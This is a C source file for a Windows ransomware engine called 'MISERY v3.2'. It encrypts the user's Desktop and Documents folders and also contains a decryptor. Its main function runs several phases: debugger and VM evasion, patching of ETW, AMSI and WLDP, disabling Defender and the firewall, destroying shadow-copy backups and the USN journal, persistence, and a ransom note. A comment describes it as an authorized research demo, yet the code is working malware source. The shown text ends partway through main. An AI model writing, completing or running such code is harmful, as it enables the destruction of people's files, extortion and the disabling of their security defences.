#include "misery_config.h"
#include "crypto.h"
#include "fileops.h"
#include "defense.h"
#include "security.h"
#include "persistence.h"
#include "utils.h"
#include "ransomnote.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include <time.h>
#include <shlobj.h>

#define KEYFILE "misery.key"
#define MAX_TARGETS 100
#define ENCRYPTION_TIMEOUT_MS 300000

/* Target directories for encryption/decryption.
   IMPORTANT: misery.key is saved OUTSIDE these directories. */
const char *g_target_dirs[] = {
    "C:\\Users\\jahan\\OneDrive\\Desktop",
    "C:\\Users\\jahan\\Documents",
    NULL
};


 // Generate 32 cryptographically random bytes using CryptoAPI.
 
static void GenerateRawKey(BYTE *key, DWORD keySize) {
    HCRYPTPROV hProv = 0;
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, keySize, key);
        CryptReleaseContext(hProv, 0);
        return;
    }
    /* Extreme fallback – should never reach here on Windows */
    HCRYPTPROV hProv2 = 0;
    CryptAcquireContextA(&hProv2, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptGenRandom(hProv2, keySize, key);
    CryptReleaseContext(hProv2, 0);
}

/*
 Save key file in clean hex format to a location OUTSIDE all
 * target directories.
 *
 * Format:
 *   <32 hex chars for salt>
 *   <64 hex chars for key>
 *
 * FIX v3.2: Do NOT overwrite an existing misery.key.
 * If a key file already exists (from a previous encryption run),
 * save the new one as "misery.key.new" to preserve the old key.
 * This prevents the decryptor from losing the ability to decrypt
 * files encrypted by the older run.
 * */
static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
    int savedCount = 0;
    char saltHex[33], keyHex[65];
    bytes_to_hex(salt, SALT_SIZE, saltHex);
    bytes_to_hex(rawKey, keyLen, keyHex);

    /* Helper: write key content to a given path */
    #define WRITE_KEY_FILE(path, label) do {                                   \
        FILE *kf = fopen(path, "r");                                          \
        bool exists = (kf != NULL);                                            \
        if (kf) fclose(kf);                                                    \
        char finalPath[MAX_PATH * 2];                                          \
        if (exists) {                                                          \
            snprintf(finalPath, sizeof(finalPath), "%s.new", path);           \
            MiseryLog(MISERY_LOG_INFO,                                         \
                "Key file exists at %s, saving new key as %s.new",             \
                path, path);                                                   \
        } else {                                                               \
            snprintf(finalPath, sizeof(finalPath), "%s", path);               \
        }                                                                      \
        kf = fopen(finalPath, "w");                                            \
        if (kf) {                                                              \
            fprintf(kf, "%s\n%s\n", saltHex, keyHex);                        \
            fclose(kf);                                                        \
            MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", finalPath);        \
            savedCount++;                                                      \
        }                                                                      \
    } while(0)

    /* Location 1: %TEMP% – guaranteed outside all target dirs */
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", tempPath);
        WRITE_KEY_FILE(keyPath, "TEMP");
    }

    /* Location 2: Desktop (user-visible, but we skip it in fileops) */
    char desktop[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", desktop);
        WRITE_KEY_FILE(keyPath, "Desktop");
    }

    /* Location 3: CWD – with IsKeyFilePath exclusion in fileops */
    char cwd[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
        /* Skip if CWD is same as Desktop or TEMP (avoid duplicate) */
        bool dup = (_stricmp(cwd, desktop) == 0);
        if (!dup && GetTempPathA(MAX_PATH, tempPath)) {
            /* Compare without trailing backslash */
            size_t cwdLen = strlen(cwd);
            size_t tmpLen = strlen(tempPath);
            if (cwdLen > 0 && cwd[cwdLen-1] == '\\') cwdLen--;
            if (tmpLen > 0 && tempPath[tmpLen-1] == '\\') tmpLen--;
            dup = (cwdLen == tmpLen && _strnicmp(cwd, tempPath, cwdLen) == 0);
        }
        if (!dup) {
            char keyPath[MAX_PATH * 2];
            snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", cwd);
            WRITE_KEY_FILE(keyPath, "CWD");
        }
    }

    #undef WRITE_KEY_FILE
    return savedCount > 0;
}

/* ===================================================================
 * Open misery.key from any known location.
 * Returns handle opened in text mode ("r") for hex parsing.
 * =================================================================== */
static FILE *OpenKeyFile(char *outPath, size_t outPathSize) {
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        snprintf(outPath, outPathSize, "%s\\misery.key", tempPath);
        FILE *kf = fopen(outPath, "r");
        if (kf) return kf;
    }

    char desktop[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
        snprintf(outPath, outPathSize, "%s\\misery.key", desktop);
        FILE *kf = fopen(outPath, "r");
        if (kf) return kf;
    }

    snprintf(outPath, outPathSize, "misery.key");
    FILE *kf = fopen(outPath, "r");
    if (kf) return kf;

    return NULL;
}

/* ===================================================================
 * FIX v3.2: Recursive collector that finds ALL .encrypted files
 * and extracts each file's embedded 16-byte salt.
 *
 * Populates:
 *   outFiles[]  – UTF-8 paths of .encrypted files found
 *   outSalts[]  – 16-byte salt read from each file's header
 *   outCount    – number of files collected (capped at maxCount)
 *
 * Returns true if at least one file was found.
 * =================================================================== */
static bool CollectEncryptedFilesRecursive(const WCHAR *root,
                                           char **outFiles, BYTE (*outSalts)[SALT_SIZE],
                                           int *outCount, int maxCount) {
    if (*outCount >= maxCount) return true; /* already full */

    WCHAR searchPath[FILEOPS_MAX_PATH];
    _snwprintf(searchPath, FILEOPS_MAX_PATH - 1, L"%s\\*", root);

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileExW(searchPath, FindExInfoStandard, &fd,
                                     FindExSearchNameMatch, NULL, 0);
    if (hFind == INVALID_HANDLE_VALUE) return false;

    bool anyFound = false;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
            continue;

        WCHAR fullPath[FILEOPS_MAX_PATH];
        _snwprintf(fullPath, FILEOPS_MAX_PATH - 1, L"%s\\%s", root, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            /* Recurse into subdirectory */
            if (CollectEncryptedFilesRecursive(fullPath, outFiles, outSalts,
                                               outCount, maxCount)) {
                anyFound = true;
            }
        } else {
            /* Check if this file ends with .encrypted */
            size_t len = wcslen(fullPath);
            if (len >= 11 && _wcsicmp(fullPath + len - 10, L".encrypted") == 0) {
                /* Read salt from this file */
                HANDLE hFile = CreateFileW(fullPath, GENERIC_READ,
                    FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD rb = 0;
                    int idx = *outCount;
                    if (idx < maxCount &&
                        ReadFile(hFile, outSalts[idx], SALT_SIZE, &rb, NULL) &&
                        rb == SALT_SIZE) {
                        /* Convert path to UTF-8 */
                        outFiles[idx] = (char *)malloc(FILEOPS_MAX_PATH);
                        if (outFiles[idx]) {
                            WideCharToMultiByte(CP_UTF8, 0, fullPath, -1,
                                outFiles[idx], FILEOPS_MAX_PATH, NULL, NULL);
                            (*outCount)++;
                            anyFound = true;
                        }
                    }
                    CloseHandle(hFile);
                }
            }
        }
    } while (FindNextFileW(hFind, &fd) != 0 && *outCount < maxCount);

    FindClose(hFind);
    return anyFound;
}

/* ===================================================================
 * FIX v3.2: Find an .encrypted file whose embedded salt MATCHES
 * the provided keySalt.
 *
 * When the user runs encryption multiple times, each run generates
 * a new salt and overwrites misery.key. But old .encrypted files
 * (from previous runs) retain their original salt. The decryptor
 * must find a file whose salt matches the CURRENT key's salt.
 *
 * Returns true and fills outPath/outSalt on match.
 * =================================================================== */
static bool FindEncryptedFileWithMatchingSalt(const BYTE *keySalt,
                                              BYTE *outSalt, char *outPath,
                                              size_t outPathSize) {
    #define MAX_COLLECT 256
    char  *files[MAX_COLLECT];
    BYTE   salts[MAX_COLLECT][SALT_SIZE];
    int    count = 0;
    memset(files, 0, sizeof(files));
    memset(salts, 0, sizeof(salts));

    /* Collect all .encrypted files from all target directories */
    for (int i = 0; g_target_dirs[i] && count < MAX_COLLECT; i++) {
        WCHAR wideRoot[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                            wideRoot, FILEOPS_MAX_PATH);
        CollectEncryptedFilesRecursive(wideRoot, files, salts, &count, MAX_COLLECT);
    }

    MiseryLog(MISERY_LOG_INFO,
              "Decrypt: Scanned %d .encrypted files for salt match", count);

    /* Log key salt for debugging */
    char keySaltHex[33];
    bytes_to_hex(keySalt, SALT_SIZE, keySaltHex);
    MiseryLog(MISERY_LOG_INFO, "Decrypt: Looking for files with salt=%s", keySaltHex);

    bool found = false;
    for (int i = 0; i < count; i++) {
        char fileSaltHex[33];
        bytes_to_hex(salts[i], SALT_SIZE, fileSaltHex);
        MiseryLog(MISERY_LOG_INFO,
                  "Decrypt: [%d/%d] %s salt=%s",
                  i + 1, count, files[i], fileSaltHex);

        if (memcmp(salts[i], keySalt, SALT_SIZE) == 0) {
            /* MATCH found */
            memcpy(outSalt, salts[i], SALT_SIZE);
            snprintf(outPath, outPathSize, "%s", files[i]);
            MiseryLog(MISERY_LOG_INFO,
                      "Decrypt: MATCH FOUND at [%d]: %s", i + 1, files[i]);
            found = true;
            break;
        }
    }

    /* Cleanup allocated strings */
    for (int i = 0; i < count; i++) {
        if (files[i]) free(files[i]);
    }

    #undef MAX_COLLECT
    return found;
}

/* ===================================================================
 * Legacy: Find first .encrypted file (used as fallback when
 * the caller provides the salt directly, e.g. CLI -d mode).
 * =================================================================== */
static bool FindFirstEncryptedFileAndSalt(BYTE *outSalt, char *outPath,
                                           size_t outPathSize) {
    for (int i = 0; g_target_dirs[i]; i++) {
        WCHAR wideRoot[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                            wideRoot, FILEOPS_MAX_PATH);
        /* Reuse the collector but only need first match */
        char  *files[1] = {NULL};
        BYTE   salts[1][SALT_SIZE];
        int    count = 0;
        if (CollectEncryptedFilesRecursive(wideRoot, files, salts, &count, 1)) {
            if (count > 0) {
                memcpy(outSalt, salts[0], SALT_SIZE);
                snprintf(outPath, outPathSize, "%s", files[0]);
                free(files[0]);
                return true;
            }
        }
    }
    return false;
}

/* ===================================================================
 * FIX v3.2: Fully rewritten decryption engine.
 *
 * Flow (GUI mode – keyHex only, no salt):
 *   1. Parse hex key string to 32 raw bytes
 *   2. Derive a temporary key+salt to compute the "key salt"
 *      (the salt that would be embedded in files encrypted by this key)
 *   3. Search ALL .encrypted files for one whose salt matches
 *   4. Test-decrypt that matching file – if HMAC fails, key is WRONG
 *   5. Run full FileOps decrypt on all target directories
 *
 * Why this fix is needed:
 *   Multiple encryption runs each generate a new random salt.
 *   Old .encrypted files retain their original salt. The old code
 *   picked the FIRST .encrypted file found and used its salt for
 *   test-decrypt. If that file was from an older run, the salt
 *   wouldn't match → false "key incorrect" error.
 *   Now we scan all files and pick one with a MATCHING salt.
 * =================================================================== */
bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
    if (!keyHex || !*keyHex) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: No key provided");
        return false;
    }

    MiseryLog(MISERY_LOG_INFO, "Decrypt: Starting with provided key");

    /* Parse hex key: must be 64 hex characters (32 bytes) */
    size_t hexLen = strlen(keyHex);
    /* Trim trailing whitespace */
    while (hexLen > 0 && (keyHex[hexLen - 1] == '\r' ||
                          keyHex[hexLen - 1] == '\n' ||
                          keyHex[hexLen - 1] == ' '))
        hexLen--;

    if (hexLen != (size_t)RAW_KEY_SIZE * 2) {
        MiseryLog(MISERY_LOG_ERROR,
                  "Decrypt: Key must be %d hex chars (got %zu)",
                  RAW_KEY_SIZE * 2, hexLen);
        return false;
    }

    BYTE rawKey[RAW_KEY_SIZE];
    if (!hex_to_bytes(keyHex, hexLen, rawKey, sizeof(rawKey))) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to parse hex key (hex_to_bytes)");
        return false;
    }

    /* =================================================================
     * FIX v3.2: Derive the "key salt" from the raw key.
     *
     * When encrypting, InitCryptoRaw(rawKey, ..., NULL) generates a
     * random salt internally. The same raw key + the SAME salt always
     * produces the same derived AES key and HMAC key.
     *
     * The salt embedded in .encrypted files is whatever salt was
     * generated during that specific encryption run. So to find which
     * files belong to this key, we need to know what salt was used.
     *
     * Since we only have the raw key (from GUI paste), we init crypto
     * with a NULL salt → it generates a NEW random salt. That won't
     * match anything.
     *
     * SOLUTION: Instead of trying to derive the salt from the key
     * (impossible – it's random), we collect ALL .encrypted files,
     * read each file's salt, init crypto with rawKey + that salt,
     * and test-decrypt. The file that passes HMAC is the match.
     * =================================================================
     *
     * OPTIMIZED APPROACH: Collect all unique salts from .encrypted
     * files, try each one until HMAC verification passes.
     */
    #define MAX_SALT_CANDIDATES 64

    char  *files[MAX_SALT_CANDIDATES];
    BYTE   fileSalts[MAX_SALT_CANDIDATES][SALT_SIZE];
    int    totalCount = 0;
    memset(files, 0, sizeof(files));
    memset(fileSalts, 0, sizeof(fileSalts));

    /* Collect all .encrypted files */
    for (int i = 0; g_target_dirs[i] && totalCount < MAX_SALT_CANDIDATES; i++) {
        WCHAR wideRoot[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                            wideRoot, FILEOPS_MAX_PATH);
        CollectEncryptedFilesRecursive(wideRoot, files, fileSalts,
                                       &totalCount, MAX_SALT_CANDIDATES);
    }

    if (totalCount == 0) {
        MiseryLog(MISERY_LOG_WARN, "Decrypt: No .encrypted files found");
        if (outStats) {
            outStats->filesSucceeded = 0;
            outStats->filesFailed = 0;
            outStats->bytesProcessed = 0;
        }
        return true; /* Nothing to decrypt is not a failure */
    }

    MiseryLog(MISERY_LOG_INFO,
              "Decrypt: Found %d .encrypted file(s), testing key against each...",
              totalCount);

    /*
     * Try each file's salt until we find one where HMAC verification
     * passes. This is the CORRECT approach because:
     *   - Each encryption run uses a unique random salt
     *   - The same raw key with different salts produces different AES/HMAC keys
     *   - Only the correct (key, salt) pair will pass HMAC
     */
    int    matchedIdx   = -1;
    BYTE   matchedSalt[SALT_SIZE] = {0};
    char   matchedPath[FILEOPS_MAX_PATH] = {0};

    for (int i = 0; i < totalCount; i++) {
        char saltHex[33];
        bytes_to_hex(fileSalts[i], SALT_SIZE, saltHex);
        MiseryLog(MISERY_LOG_INFO,
                  "Decrypt: Trying salt[%d/%d]=%s from %s",
                  i + 1, totalCount, saltHex, files[i]);

        /* Initialize crypto with rawKey + this file's salt */
        CleanupCrypto();
        CRYPTO_ERROR cerr = InitCryptoRaw(rawKey, RAW_KEY_SIZE, fileSalts[i]);
        if (cerr != CRYPTO_SUCCESS) {
            MiseryLog(MISERY_LOG_WARN,
                      "Decrypt: InitCryptoRaw failed for salt[%d]: %s",
                      i + 1, GetErrorString(cerr));
            continue;
        }

        /* Test-decrypt this file */
        HANDLE hTest = CreateFileA(files[i], GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hTest == INVALID_HANDLE_VALUE) {
            MiseryLog(MISERY_LOG_WARN, "Decrypt: Cannot open %s, skipping", files[i]);
            continue;
        }

        DWORD fs = GetFileSize(hTest, NULL);
        if (fs == INVALID_FILE_SIZE || fs == 0 || fs > 10 * 1024 * 1024) {
            MiseryLog(MISERY_LOG_WARN,
                      "Decrypt: File %s has invalid size (%lu), skipping",
                      files[i], fs);
            CloseHandle(hTest);
            continue;
        }

        BYTE *testBuf = (BYTE *)VirtualAlloc(NULL, fs, MEM_COMMIT, PAGE_READWRITE);
        BYTE *testOut = (BYTE *)VirtualAlloc(NULL, fs, MEM_COMMIT, PAGE_READWRITE);

        bool thisMatch = false;
        if (testBuf && testOut) {
            DWORD rd = 0;
            if (ReadFile(hTest, testBuf, fs, &rd, NULL) && rd == fs) {
                DWORD outLen = 0;
                cerr = DecryptBuffer(GetCryptoCtx(), testBuf, fs,
                                     testOut, &outLen);
                if (cerr == CRYPTO_SUCCESS) {
                    MiseryLog(MISERY_LOG_INFO,
                              "Decrypt: KEY VERIFIED with salt[%d]=%s (%lu bytes decrypted)",
                              i + 1, saltHex, outLen);
                    thisMatch = true;
                } else {
                    MiseryLog(MISERY_LOG_INFO,
                              "Decrypt: salt[%d]=%s HMAC mismatch (%s), trying next...",
                              i + 1, saltHex, GetErrorString(cerr));
                }
            }
        }

        if (testBuf) VirtualFree(testBuf, 0, MEM_RELEASE);
        if (testOut) VirtualFree(testOut, 0, MEM_RELEASE);
        CloseHandle(hTest);

        if (thisMatch) {
            matchedIdx = i;
            memcpy(matchedSalt, fileSalts[i], SALT_SIZE);
            snprintf(matchedPath, sizeof(matchedPath), "%s", files[i]);
            break;
        }
    }

    /* Cleanup collected file paths */
    for (int i = 0; i < totalCount; i++) {
        if (files[i]) free(files[i]);
    }

    if (matchedIdx < 0) {
        /* No file's salt matched — the key is genuinely wrong */
        MiseryLog(MISERY_LOG_ERROR,
                  "Decrypt: KEY INCORRECT – tested %d file(s), none matched",
                  totalCount);
        CleanupCrypto();
        SecureZeroMemory(rawKey, sizeof(rawKey));
        return false;
    }

    MiseryLog(MISERY_LOG_INFO,
              "Decrypt: Key verified using file: %s (salt index %d)",
              matchedPath, matchedIdx + 1);

    /* Crypto context is already initialized with the matching salt.
     * Proceed to full decryption. */

    /* Key is valid – run full decryption */
    FILEOPS_CONFIG cfg = {0};
    cfg.threadCount   = 8;
    cfg.ioBufferSize  = (64 * 1024);
    cfg.flags         = FILEOPS_FLAG_RECURSIVE;
    cfg.pfnShouldSkip = FileOps_DefaultShouldSkip;
    cfg.crypto_ctx    = GetCryptoCtx();
    cfg.decryptMode   = true;

    FILEOPS_CTX *fctx = FileOps_CreateContext(&cfg);
    if (!fctx) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to create FileOps context");
        CleanupCrypto();
        SecureZeroMemory(rawKey, sizeof(rawKey));
        return false;
    }

    for (int i = 0; g_target_dirs[i]; i++) {
        WCHAR widePath[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                            widePath, FILEOPS_MAX_PATH);
        MiseryLog(MISERY_LOG_INFO, "Decrypt: Queuing directory: %s",
                  g_target_dirs[i]);
        FileOps_TraverseAndQueue(fctx, widePath);
    }

    MiseryLog(MISERY_LOG_INFO, "Decrypt: Waiting for decryption to complete...");
    FileOps_WaitForCompletion(fctx);

    if (outStats) FileOps_GetStats(fctx, outStats);

    FILEOPS_STATS stats;
    FileOps_GetStats(fctx, &stats);
    MiseryLog(MISERY_LOG_INFO,
              "Decrypt: Complete – %lld OK, %lld failed, %lld bytes",
              stats.filesSucceeded, stats.filesFailed, stats.bytesProcessed);

    FileOps_DestroyContext(fctx);
    CleanupCrypto();
    SecureZeroMemory(rawKey, sizeof(rawKey));
    return true;
}

/* ===================================================================
 * PHASE EXECUTIONS (unchanged from original, using Updated crypto)
 * =================================================================== */

static bool ExecutePhaseAntiAnalysis(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting ANTI-ANALYSIS phase...");
    bool success = true;
    if (DefenseCheckDebugger()) {
        MiseryLog(MISERY_LOG_WARN, "Debugger detected! Aborting.");
        return false;
    }
    if (DefenseDetectAnalysisTools()) {
        MiseryLog(MISERY_LOG_WARN, "Analysis tools detected!");
        success = false;
    }
    if (DefenseDetectVirtualMachine()) {
        MiseryLog(MISERY_LOG_WARN, "VM detected!");
        success = false;
    }
    return MiseryPhaseTransition(PHASE_ANTI_ANALYSIS, success);
}

static bool ExecutePhaseDefensePatching(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting DEFENSE PATCHING phase...");
    bool success = true;
    if (!DefensePatchETW())        { MiseryLog(MISERY_LOG_WARN, "ETW patch failed");  success = false; }
    if (!DefensePatchAMSI())       { MiseryLog(MISERY_LOG_WARN, "AMSI patch failed"); success = false; }
    if (!DefensePatchWLDP())       { MiseryLog(MISERY_LOG_WARN, "WLDP patch failed"); success = false; }
    DefenseHideFromDebugger();
    DefenseResetSecurityChecks();
    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
}

static bool ExecutePhaseSecurityDisable(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting SECURITY DISABLE phase...");
    bool success = true;
    if (!SecurityDisableDefender())      { MiseryLog(MISERY_LOG_WARN, "Defender disable failed");  success = false; }
    if (!SecurityKillSecurityServices()) { MiseryLog(MISERY_LOG_WARN, "Svc kill failed");          success = false; }
    if (!SecurityDisableFirewall())      { MiseryLog(MISERY_LOG_WARN, "Firewall disable failed");  success = false; }
    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
}

static bool ExecutePhaseBackupDestroy(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting BACKUP DESTROY phase...");
    bool success = true;
    if (!UtilsNukeBackups())     { MiseryLog(MISERY_LOG_WARN, "VSS nuke failed");  success = false; }
    if (!UtilsWipeUSNJournal())  { MiseryLog(MISERY_LOG_WARN, "USN wipe failed");  success = false; }
    return MiseryPhaseTransition(PHASE_BACKUP_DESTROY, success);
}

static bool ExecutePhaseEncryption(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting ENCRYPTION phase...");
    bool success = true;

    CRYPTO_CTX *crypto_ctx = GetCryptoCtx();
    if (!crypto_ctx || !crypto_ctx->initialized) {
        MiseryLog(MISERY_LOG_ERROR, "Crypto context not initialized!");
        return MiseryPhaseTransition(PHASE_ENCRYPTION, false);
    }

    FILEOPS_CONFIG cfg = {0};
    cfg.threadCount   = 8;
    cfg.ioBufferSize  = (64 * 1024);
    cfg.flags         = FILEOPS_FLAG_RECURSIVE;
    cfg.pfnShouldSkip = FileOps_DefaultShouldSkip;
    cfg.crypto_ctx    = crypto_ctx;
    cfg.decryptMode   = false;

    FILEOPS_CTX *fctx = FileOps_CreateContext(&cfg);
    if (!fctx) {
        MiseryLog(MISERY_LOG_ERROR, "Failed to create FileOps context");
        return MiseryPhaseTransition(PHASE_ENCRYPTION, false);
    }

    for (int i = 0; g_target_dirs[i]; i++) {
        WCHAR widePath[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                            widePath, FILEOPS_MAX_PATH);
        FileOps_TraverseAndQueue(fctx, widePath);
    }

    FileOps_WaitForCompletion(fctx);

    FILEOPS_STATS stats = {0};
    FileOps_GetStats(fctx, &stats);

    MiseryLog(MISERY_LOG_INFO,
              "Encryption stats: %lld bytes, %lld succeeded, %lld failed",
              stats.bytesProcessed, stats.filesSucceeded, stats.filesFailed);

    g_misery_ctx.filesEncrypted = (DWORD)stats.filesSucceeded;
    g_misery_ctx.filesFailed    = (DWORD)stats.filesFailed;
    g_misery_ctx.bytesEncrypted = stats.bytesProcessed;

    FileOps_DestroyContext(fctx);
    return MiseryPhaseTransition(PHASE_ENCRYPTION, success);
}

static bool ExecutePhasePeristence(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting PERSISTENCE phase...");
    bool success = PersistenceInstallAll();
    return MiseryPhaseTransition(PHASE_PERSISTENCE, success);
}

static bool ExecutePhaseRansomNote(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting RANSOM NOTE phase...");

    /* Drop text note on desktop */
    const char *note_content =
        "========================================\n"
        "YOUR FILES HAVE BEEN ENCRYPTED\n"
        "========================================\n"
        "This is a research project demonstration.\n"
        "For authorized penetration tests only.\n"
        "========================================\n";

    char desktop_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) == S_OK) {
        char note_path[MAX_PATH * 2];
        snprintf(note_path, sizeof(note_path), "%s\\README.txt", desktop_path);
        UtilsDropRansomNote(note_path, note_content);
    }

    /* Show GUI window – BLOCKING */
    ShowRansomNoteWindow();

    return MiseryPhaseTransition(PHASE_RANSOM_NOTE, true);
}

static bool ExecutePhaseCleanup(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting CLEANUP phase...");
    CleanupCrypto();
    return MiseryPhaseTransition(PHASE_CLEANUP, true);
}

/* ===================================================================
 * MAIN
 * =================================================================== */
int main(int argc, char **argv) {
    DWORD start_time = GetTickCount();

    if (!MiseryInitContext()) {
        puts("[!] Failed to initialize context");
        return 1;
    }

    puts("========== MISERY v3.2 RANSOMWARE ENGINE ==========");
    MiseryLog(MISERY_LOG_INFO, "=== MISERY INITIALIZATION ===");

    bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);

    if (decryptmode) {
        /* ============================================================
         * DECRYPT MODE – parse hex key file
         *
         * In CLI mode, the full misery.key (salt + key) is available,
         * so we can directly init crypto with the correct salt and
         * don't need the salt-scanning logic.
         * ============================================================ */
        MiseryLog(MISERY_LOG_INFO, "Mode: COMMAND-LINE DECRYPT");

        char keyfilePath[MAX_PATH * 2] = {0};
        FILE *kf = OpenKeyFile(keyfilePath, sizeof(keyfilePath));
        if (!kf) {
            MiseryLog(MISERY_LOG_ERROR, "Missing misery.key! Cannot decrypt.");
            MiseryCleanupContext();
            return 1;
        }

        char saltHex[35] = {0};   /* 32 hex + possible \r\n + null */
        char keyHex[67]  = {0};   /* 64 hex + possible \r\n + null */
        if (!fgets(saltHex, sizeof(saltHex), kf)) {
            MiseryLog(MISERY_LOG_ERROR, "Failed to read salt from %s", keyfilePath);
            fclose(kf); MiseryCleanupContext(); return 1;
        }
        saltHex[strcspn(saltHex, "\r\n")] = '\0';

        if (!fgets(keyHex, sizeof(keyHex), kf)) {
            MiseryLog(MISERY_LOG_ERROR, "Failed to read key from %s", keyfilePath);
            fclose(kf); MiseryCleanupContext(); return 1;
        }
        keyHex[strcspn(keyHex, "\r\n")] = '\0';
        fclose(kf);

        MiseryLog(MISERY_LOG_INFO, "Decrypt: Loaded from %s (salt=%s key=%s...)",
                  keyfilePath, saltHex,
                  (strlen(keyHex) > 8) ? (char[]){keyHex[0],keyHex[1],keyHex[2],
                  keyHex[3],keyHex[4],keyHex[5],keyHex[6],keyHex[7],'.','.','.',0}
                  : "???");

        /* Convert hex to raw bytes */
        BYTE salt[SALT_SIZE] = {0};
        if (!hex_to_bytes(saltHex, strlen(saltHex), salt, sizeof(salt))) {
            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to parse salt hex");
            return 1;
        }

        BYTE rawKey[RAW_KEY_SIZE];
        if (!hex_to_bytes(keyHex, strlen(keyHex), rawKey, sizeof(rawKey))) {
            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to parse key hex");
            SecureZeroMemory(rawKey, sizeof(rawKey));
            return 1;
        }

        /* CLI mode: init crypto with the known salt from key file,
         * then fall through to MiseryRunDecrypt which will use the
         * salt-scanning approach (it will match on the first try since
         * we already have the correct salt, but the crypto context
         * gets re-initialized inside MiseryRunDecrypt). */
        CleanupCrypto();
        CRYPTO_ERROR cerr = InitCryptoRaw(rawKey, RAW_KEY_SIZE, salt);
        SecureZeroMemory(rawKey, sizeof(rawKey));
        if (cerr != CRYPTO_SUCCESS) {
            MiseryLog(MISERY_LOG_ERROR, "InitCryptoRaw failed: %s", GetErrorString(cerr));
            MiseryCleanupContext();
            return 1;
        }

        FILEOPS_STATS stats = {0};
        if (MiseryRunDecrypt(keyHex, &stats)) {
            MiseryLog(MISERY_LOG_INFO,
                      "Decrypt: %lld files decrypted, %lld failed",
                      stats.filesSucceeded, stats.filesFailed);
        } else {
            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed – wrong key or corrupt data");
        }

        CleanupCrypto();
        MiseryCleanupContext();
        printf("[+] Done\n");
        return 0;
    }

    /* ================================================================
     * ENCRYPT MODE
     * ================================================================ */
    MiseryLog(MISERY_LOG_INFO, "Mode: ENCRYPT");

    /* Generate 32 cryptographically secure random bytes */
    BYTE rawKey[RAW_KEY_SIZE] = {0};
    GenerateRawKey(rawKey, RAW_KEY_SIZE);

    /* Log first 8 hex chars for debugging */
    char preview[17];
    for (int i = 0; i < 8; i++) sprintf(preview + i * 2, "%02x", rawKey[i]);
    preview[16] = '\0';
    MiseryLog(MISERY_LOG_INFO, "Generated raw key: %s...", preview);

    /* Initialize crypto with raw key and random salt */
    CleanupCrypto();
    CRYPTO_ERROR cerr = InitCryptoRaw(rawKey, RAW_KEY_SIZE, NULL);
    if (cerr != CRYPTO_SUCCESS) {
        MiseryLog(MISERY_LOG_ERROR, "InitCryptoRaw failed: %s", GetErrorString(cerr));
        SecureZeroMemory(rawKey, sizeof(rawKey));
        MiseryCleanupContext();
        return 1;
    }

    /* Save key file (hex format) – FIX: won't overwrite existing */
    if (!SaveKeyFile(rawKey, RAW_KEY_SIZE, GetCryptoCtx()->salt)) {
        MiseryLog(MISERY_LOG_ERROR, "CRITICAL: Failed to save key to ANY location!");
    } else {
        MiseryLog(MISERY_LOG_INFO, "Key file saved successfully.");
    }
    SecureZeroMemory(rawKey, sizeof(rawKey));

    /* Execute phases */
    if (!ExecutePhaseAntiAnalysis())
        MiseryLog(MISERY_LOG_WARN, "Anti-analysis failed, continuing...");

    ExecutePhaseDefensePatching();
    ExecutePhaseSecurityDisable();
    ExecutePhaseBackupDestroy();

    if (!ExecutePhaseEncryption()) {
        MiseryLog(MISERY_LOG_ERROR, "Encryption phase failed!");
        MiseryCleanupContext();
        return 1;
    }

